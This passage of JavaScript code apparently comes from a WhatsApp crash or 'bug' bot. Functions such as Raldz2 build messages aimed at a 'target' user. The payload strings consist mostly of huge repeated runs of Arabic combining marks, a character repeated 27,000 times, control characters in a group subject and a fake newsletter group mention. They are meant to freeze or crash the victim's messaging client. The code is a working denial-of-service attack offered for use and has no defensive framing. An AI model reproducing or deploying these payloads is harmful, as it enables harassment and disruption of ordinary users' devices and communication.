̷⃨ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗ⃛".repeat(5)+ "ꦾ".repeat(27000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "\u0000\u0011",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function Raldz2(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "[🦠] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n" + "꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫